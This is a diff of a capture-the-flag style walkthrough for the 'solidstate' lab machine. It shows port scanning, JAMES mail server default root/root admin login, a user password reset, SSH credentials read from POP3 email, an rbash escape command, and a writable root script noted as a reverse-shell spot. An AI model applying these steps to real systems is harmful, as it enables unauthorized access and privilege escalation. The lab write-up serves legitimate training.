@@ -24,7 +24,7 @@ nmap -sn 172.16.33.0/24
 ### port scanning
 
 ```bash
-nmap -p- -A 172.16.33.35 -o ./nmap/sr
+nmap -p- -A 172.16.33.35
 
 Nmap scan report for 172.16.33.35
 Host is up (0.070s latency).
@@ -78,23 +78,111 @@ dirsearch -u http://172.16.33.35 -f -e php,asp,aspx,jsp,html,txt,zip
 
 #### smtp(25, 110, 119 4555) - JAMES smtpd 2.3.2
 
-#### searchsploit
+##### searchsploit
 
 ```bash
 searchsploit James
 searchsploit -m 35513
 ```
 
-### rbash bypass
+actually, the poc is used username and password root/root to add a new user.
+we also can use root/root to login JAMES Remote Admin which port is 4555.
 
-ssh
+##### login JAMES Remote Admin
+
+after login, we can update the user's password.
+
+```bash
+nc -nv 172.16.33.35 4555
+
+listusers
+Existing accounts 5
+user: james
+user: thomas
+user: john
+user: mindy
+user: mailadmin
+
+setpassword mindy 123
+Password for mindy reset
+```
+
+##### login JAMES pop3d
+
+and then use the new password to login JAMES pop3d which port is 110, and view the email.
+after login, and then retr the email, we can get the ssh username and password.
+
+```bash
+nc -nv 172.16.33.35 110 -C
+
++OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
+user mindy
++OK
+pass 123
++OK Welcome mindy
+
+list
++OK 2 1945
+1 1109
+2 836
+
+retr 2
++OK Message follows
+username: mindy
+pass: P@55W0rd1!2@
+```
+
+##### rbash bypass
+
+```bash
+ssh mindy@172.16.33.35 "export TERM=xterm; python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+```
 
 ### priviledge escalation
 
-```bash
-python -c 'import pty;pty.spawn("/bin/bash")'
+#### information gathering
 
+```bash
+id
+uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
+
+sudo -l
+bash: sudo: command not found
+
+uname -a
+Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686 GNU/Linux
+
+find / -type f -user root -perm -o=w 2>/dev/null | grep -v 'proc\|sys'
+/opt/tmp.py
+
+cat /opt/tmp.py
+#!/usr/bin/env python
+import os
+import sys
+try:
+     os.system('rm -r /tmp/* ')
+except:
+     sys.exit()
+```
+
+the script is used to delete all files in /tmp, and it is owned by root, and it is writable.
+it looks like the script is used to clean the /tmp directory regularly, and it is a good place to put a reverse shell.
+
+#### full pty
+
+```bash
 stty -a
+speed 38400 baud; rows 0; columns 0; line = 0;
+intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>;
+eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R;
+werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
+-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
+-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff
+-iuclc -ixany -imaxbel -iutf8
+opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
+isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt
+echoctl echoke -flusho -extproc
+
 stty raw -echo
 fg
 export TERM=xterm
